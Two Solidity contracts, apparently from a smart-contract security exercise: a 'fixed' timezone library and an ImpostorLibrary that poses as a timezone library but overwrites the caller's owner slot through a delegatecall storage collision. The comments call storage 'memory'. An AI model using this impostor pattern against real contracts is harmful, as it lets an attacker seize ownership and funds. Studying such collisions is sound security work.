// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

/**
 * This timezone library fixes a bug in the original, which is that the memory slots are not arranged
 * correctly. In the original, memory would be overwritten (not the correct memory slot) by setTime. 
 */
contract FixedTimeLibrary {
    address private a;
    address private b;
    address private c;
    uint private storedTime;  

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

contracts/ImpostorLibrary.sol.content:
pragma solidity ^0.8.0; 
//SPDX-License-Identifier: UNLICENSED

/**
 * This pretends to be a timezone library, but actually it will overwrite the owner in the memory 
 * of the contract that calls it. 
 */
contract ImpostorLibrary {
    address private a;
    address private b;
    uint private owner; 

    function setTime(uint _time) public {
        owner = _time;
    }
}

